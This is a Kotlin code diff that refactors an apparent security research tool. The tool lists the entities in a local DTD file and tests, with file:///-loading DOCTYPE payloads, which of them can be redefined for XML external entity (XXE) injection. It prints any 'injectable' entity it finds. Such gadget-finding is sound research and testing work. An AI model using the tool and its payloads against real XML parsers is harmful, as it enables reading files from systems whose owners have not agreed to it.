@@ -1,15 +1,20 @@
 
+import com.sun.org.apache.xerces.internal.impl.Constants
 import com.sun.org.apache.xerces.internal.impl.dtd.*
 import javax.xml.parsers.DocumentBuilderFactory
 
 import org.xml.sax.InputSource;
 import com.sun.org.apache.xerces.internal.util.SAXInputSource;
+import org.xml.sax.ErrorHandler
+import org.xml.sax.SAXParseException
 import java.io.*
 
-fun inspectDtd(dtdStream: InputStream): ArrayList<String> {
-    val inputSource = InputSource(InputStreamReader(dtdStream))
-    val source = SAXInputSource(inputSource)
-    val d = XMLDTDLoader()
+class EntityTester {
+
+    fun inspectDtd(dtdStream: InputStream): ArrayList<String> {
+        val inputSource = InputSource(InputStreamReader(dtdStream))
+        val source = SAXInputSource(inputSource)
+        val d = XMLDTDLoader()
 
 //    source.inputSourcexmlReader.entityResolver = EntityResolver {
 //        publicId:String, systemId:String ->
@@ -18,11 +23,11 @@ fun inspectDtd(dtdStream: InputStream): ArrayList<String> {
 //        null
 //    }
 
-    val g = d.loadGrammar(source) as DTDGrammar
+        val g = d.loadGrammar(source) as DTDGrammar
 
-    //g.printElements()
+        //g.printElements()
 
-    //Elements
+        //Elements
 //    var elementDeclIndex = 0
 //    val elementDecl = XMLElementDecl()
 //    while (g.getElementDecl(elementDeclIndex++, elementDecl)) {
@@ -39,33 +44,48 @@ fun inspectDtd(dtdStream: InputStream): ArrayList<String> {
 //        println(attDecl.name.rawname)
 //    }
 
-    val entitiesFound = ArrayList<String>()
+        val entitiesFound = ArrayList<String>()
 
-    //Entities
-    var entityIndex = 0
-    val entityDecl = XMLEntityDecl()
-    while (g.getEntityDecl(entityIndex++, entityDecl)) {
-        entitiesFound.add(entityDecl.name)
-        //println(entityDecl.name)
+        //Entities
+        var entityIndex = 0
+        val entityDecl = XMLEntityDecl()
+        while (g.getEntityDecl(entityIndex++, entityDecl)) {
+            entitiesFound.add(entityDecl.name)
+            //println(entityDecl.name)
+        }
+        return entitiesFound
     }
-    return entitiesFound
-}
 
-fun findInjectableEntity(dtdFullPath:String, listEntities:ArrayList<String>) {
+    fun findInjectableEntity(dtdFullPath:String, listEntities:ArrayList<String>) {
 
-    val builder = DocumentBuilderFactory.newInstance().newDocumentBuilder()
+        val factory = DocumentBuilderFactory.newInstance()
+        val builder = factory.newDocumentBuilder()
+        //The parser will likely logged to the console Fatal error .. We can disable all this for cleaner output
+        builder.setErrorHandler(
+                object : ErrorHandler {
+                    override fun warning(exception: SAXParseException?) {
+                    }
+
+                    override fun error(exception: SAXParseException?) {
+                    }
+
+                    override fun fatalError(exception: SAXParseException?) {
+                    }
+
+                }
+        )
 
 
 
 
-    println("Testing ${listEntities.size} ($listEntities)")
+        println("Testing ${listEntities.size} ($listEntities)")
 
-    for(entity in listEntities) {
-        val entityName = entity.replace("%","")
-        //val xmlFile = String().javaClass.getResourceAsStream("/input.xml")
-        val magicValue = "INJECTION_12345"
+        for(entity in listEntities) {
+            val entityName = entity.replace("%","")
+            //val xmlFile = String().javaClass.getResourceAsStream("/input.xml")
+            val magicValue = "INJECTION_12345"
 
-        val payloadParentheses = """
+            val payloadParentheses = """
         <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
 
@@ -79,7 +99,7 @@ fun findInjectableEntity(dtdFullPath:String, listEntities:ArrayList<String>) {
     %local_dtd;
 ]>
 """
-        val payloadQuotes = """
+            val payloadQuotes = """
         <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
 
@@ -93,7 +113,7 @@ fun findInjectableEntity(dtdFullPath:String, listEntities:ArrayList<String>) {
     %local_dtd;
 ]>
 """
-        val payloadNothing = """
+            val payloadNothing = """
         <!DOCTYPE message [
     <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">
 
@@ -108,56 +128,34 @@ fun findInjectableEntity(dtdFullPath:String, listEntities:ArrayList<String>) {
 ]>
 """
 
-        val payloads = arrayOf(payloadParentheses,payloadQuotes,payloadNothing)
+            val payloads = arrayOf(payloadParentheses,payloadQuotes,payloadNothing)
 
-        for (payload in payloads) {
-            //println(" [-] Entity name: $entityName")
+            for (payload in payloads) {
+                //println(" [-] Entity name: $entityName")
 
-            try {
-                builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
-            } catch (e: FileNotFoundException) {
-                if (e.message!!.contains(magicValue)) {
-                    println(" [+] The entity $entity is injectable")
-                    //println("Payload used:")
-                    //println(payload)
+                try {
+                    builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
+                } catch (e: FileNotFoundException) {
+                    if (e.message!!.contains(magicValue)) {
+                        println(" [+] The entity $entity is injectable")
+                        //println("Payload used:")
+                        //println(payload)
+                    }
+                } catch (e: Exception) {
+                    //Failed
+                    //println(" [!] $e.message")
                 }
-            } catch (e: Exception) {
-                //Failed
-                //println(" [!] $e.message")
             }
         }
-    }
 
 
-    //val entries = doc.getElementsByTagName("*")
+        //val entries = doc.getElementsByTagName("*")
 
 //    for (i in 0 until entries.length) {
 //        val element = entries.item(i) as Element
 //        System.out.println("Found element " + element.getNodeName() + element.textContent)
 //
 //    }
-}
-
-fun main(args: Array<String>) {
-
-
-    val currentDir = System.getProperty("user.dir")
-
-
-    val samplesDtd = arrayOf("cim20.dtd", "yelp-dtd/docbookx.dtd", "jspxml.dtd", "scrollkeeper-omf.dtd", "sip-app_1_0.dtd")
-
-    for(dtd:String in samplesDtd) {
-        println()
-        println(" == DTD: $dtd ==")
-        try {
-            val dtdPath = "$currentDir/sample_dtds/$dtd"
-            val entitiesToTest = inspectDtd(FileInputStream(dtdPath))
-            findInjectableEntity(dtdPath,entitiesToTest)
-        }
-        catch (e:Exception) {
-            println(e.message)
-            e.printStackTrace()
-        }
     }
 
 }
